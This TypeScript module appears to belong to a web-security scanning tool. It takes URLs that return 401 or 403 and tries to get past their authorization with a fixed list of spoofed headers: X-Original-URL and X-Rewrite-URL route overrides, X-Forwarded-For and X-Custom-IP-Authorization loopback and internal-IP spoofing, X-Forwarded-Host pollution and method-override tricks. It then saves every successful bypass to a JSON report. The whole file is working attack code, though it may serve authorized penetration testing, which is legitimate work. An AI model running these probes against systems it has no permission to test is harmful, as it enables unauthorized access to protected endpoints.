import { fetchUrl } from "../adapters/http.js";
import { writeFile, mkdir } from "node:fs/promises";
import { join } from "node:path";

/** Auth-header bypass family: route-override headers (X-Original-URL /
 *  X-Rewrite-URL — classic ASP.NET frontend-router bypass), internal-IP
 *  spoofing (X-Custom-IP-Authorization, X-Forwarded-For loopback),
 *  X-Forwarded-Host pollution, and method-tunneling overrides
 *  (X-HTTP-Method-Override etc.) on endpoints the recon already found
 *  to be auth-gated (401/403). Deterministic differential verdicts. */

export interface HeaderBypassInput {
  /** URLs that returned 401/403 anonymously (auth_probe output or manual). */
  readonly urls: string[];
  readonly outputRoot: string;
  readonly cookie?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  readonly maxUrls?: number;
}

export interface HeaderBypassResult {
  readonly probed: number;
  readonly attempts: {
    url: string;
    technique: string;
    headerName: string;
    baseline: number;
    tampered: number;
    verdict: "bypassed" | "no-change" | "softer-error";
    note?: string;
  }[];
  readonly bypasses: { url: string; technique: string; headerName: string; baseline: number; tampered: number; note?: string }[];
  readonly artifacts: { path: string; bytes: number }[];
}

/** Each technique: one header set. Verdict rules fixed:
 *  - bypassed: baseline 401/403 -> tampered 2xx
 *  - softer-error: 401/403 -> 4xx/5xx other than 401/403 (server behaves differently — worth eyes)
 *  - no-change otherwise */
const TECHNIQUES: { name: string; headers: Record<string, string> }[] = [
  { name: "aspnet-original-url", headers: { "x-original-url": "/" } },
  { name: "aspnet-rewrite-url", headers: { "x-rewrite-url": "/" } },
  { name: "aspnet-original-url-self", headers: { "x-original-url": "" } },
  { name: "custom-ip-authz-localhost", headers: { "x-custom-ip-authorization": "127.0.0.1" } },
  { name: "custom-ip-authz-internal", headers: { "x-custom-ip-authorization": "10.0.0.1" } },
  { name: "xff-localhost", headers: { "x-forwarded-for": "127.0.0.1" } },
  { name: "xff-internal", headers: { "x-forwarded-for": "10.0.0.1" } },
  { name: "xff-xorigin-internal", headers: { "x-forwarded-for": "10.0.0.1", "x-originating-ip": "10.0.0.1", "x-remote-ip": "10.0.0.1", "x-remote-addr": "10.0.0.1", "x-client-ip": "10.0.0.1" } },
  { name: "xfh-pollution", headers: { "x-forwarded-host": "localhost" } },
  { name: "xfh-internal", headers: { "x-forwarded-host": "127.0.0.1" } },
  { name: "method-override-put", headers: { "x-http-method-override": "PUT" } },
  { name: "method-override-delete", headers: { "x-http-method-override": "DELETE" } },
  { name: "method-override-post", headers: { "x-method-override": "POST" } },
  { name: "method-override-query", headers: {} }, // handled via ?_method= below
];

export const probeHeaderBypass = async (input: HeaderBypassInput): Promise<HeaderBypassResult> => {
  await mkdir(input.outputRoot, { recursive: true });
  const opts = { proxy: input.proxy, timeoutMs: input.timeoutMs ?? 8000, cookie: input.cookie };

  const urls = input.urls.slice(0, input.maxUrls ?? 20);
  const attempts: HeaderBypassResult["attempts"] = [];
  const bypasses: HeaderBypassResult["bypasses"] = [];

  for (const url of urls) {
    const baseline = await fetchUrl(url, { ...opts, method: "GET", headers: input.headers });
    if (baseline.status !== 401 && baseline.status !== 403) continue; // only probe gated endpoints
    const baseFp = `${baseline.status}:${baseline.sha256.slice(0, 16)}`;

    for (const t of TECHNIQUES) {
      let target = url;
      let headers: Record<string, string> = { ...input.headers, ...t.headers };
      if (t.name === "method-override-query") {
        const u = new URL(url);
        u.searchParams.set("_method", "PUT");
        target = u.toString();
        headers = { ...input.headers };
      }
      const r = await fetchUrl(target, { ...opts, method: "GET", headers });
      if (r.status === 0) continue;
      // Differential: a redirect that lands on a login page (200) is the
      // same wall, not a bypass; only a 2xx whose BODY differs from the
      // denied baseline counts. 3xx never counts as bypassed.
      const verdict: "bypassed" | "no-change" | "softer-error" =
        r.status >= 300 && r.status < 400 ? "no-change" :
        r.status >= 200 && r.status < 300 && r.sha256.slice(0, 16) !== baseFp.split(":")[1] ? "bypassed" :
        baseFp === `${r.status}:${r.sha256.slice(0, 16)}` ? "no-change" :
        (r.status === 401 || r.status === 403) ? "no-change" : "softer-error";
      attempts.push({ url, technique: t.name, headerName: Object.keys(t.headers)[0] ?? "?_method=", baseline: baseline.status, tampered: r.status, verdict });
      if (verdict === "bypassed") bypasses.push({ url, technique: t.name, headerName: Object.keys(t.headers)[0] ?? "?_method=", baseline: baseline.status, tampered: r.status });
    }
  }

  const body = JSON.stringify({ probed: urls.length, attempts, bypasses }, null, 2);
  const path = join(input.outputRoot, "header_bypass.json");
  await writeFile(path, body, "utf8");
  return { probed: urls.length, attempts, bypasses, artifacts: [{ path, bytes: Buffer.byteLength(body) }] };
};
